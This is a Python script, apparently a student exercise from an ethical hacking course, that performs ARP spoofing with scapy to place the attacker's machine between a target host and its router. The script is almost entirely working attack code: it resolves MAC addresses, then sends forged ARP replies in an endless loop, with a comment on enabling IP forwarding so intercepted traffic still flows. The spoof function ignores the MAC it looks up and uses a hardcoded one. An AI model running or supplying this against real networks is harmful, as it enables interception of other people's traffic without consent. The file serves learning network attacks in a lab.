#!/usr/bin/env python

##########################################################################################################
#
# Author: Brenyn Kissoondath
# Course: Learn Python and Ethical Hacking From Scratch - StationX
# Instructor: Zaid Al Quraishi
# Purpose: Redirect the flow of packets in a network through our computer
# Input(s): Target IP/MAC address (can be found using a network scanner)
# Output(s): 
#
# Notes to self: scapy.ls('scapy class ie "scapy.ARP"') will list all fields for that class
#				 hwtype     : XShortField                         = (1)
#				 ptype      : XShortEnumField                     = (2048)
#				 hwlen      : FieldLenField                       = (None)
#				 plen       : FieldLenField                       = (None)	
#				 op         : ShortEnumField                      = (1)		1 for request 2 for response
#				 hwsrc      : MultipleTypeField                   = (None)	our MAC, when target receives message from "source" IP it will associate the router IP address with our MAC address
#				 psrc       : MultipleTypeField                   = (None)	"source" IP, actually coming from our PC but spoofing to look like it is coming from the router
#				 hwdst      : MultipleTypeField                   = (None)	MAC of target computer
#				 pdst       : MultipleTypeField                   = (None)	ip of target computer
#																			***these fields can be found using network_scanner.py from previous lecture for all devices in network

import scapy.all as scapy
import time
import sys

def get_mac(ip):	#modified scan function from network_scanner.py

	arp_request = scapy.ARP(pdst=ip) #create an instance of scapy ARP class
	#arp_request.show()

	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #set destination to broadcast MAC address
	#broadcast.show()

	arp_request_broadcast = broadcast/arp_request #scapy allows to combine 2 requests like this to create broadcast packet
	#arp_request_broadcast.show()

	#scapy.srp returned 2 lists, a list of addresses that answered and a list that did not answer. for this program we're only interested in the addresses that answered
	answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0] # srp function will send the packet to broadcast MAC address and check all IPs provided by ip.
	return (answered_list[0][1].hwsrc)

def spoof(target_ip , spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = "08:00:27:e6:e5:59", psrc = spoof_ip)
	scapy.send(packet, verbose = False)

packets_sent = 0
while True:
	spoof("10.0.2.8","10.0.2.1")	#tell target we are the router
	spoof("10.0.2.1","10.0.2.8")	#tell router we are the target
	packets_sent += 2
	print("\r[+] Sent "+str(packets_sent)+" packets"),
	sys.stdout.flush()
	time.sleep(2)
	#echo > 1 /proc/sys/net/ipv4/ip_forward to enable ip forwarding (so target can still use internet)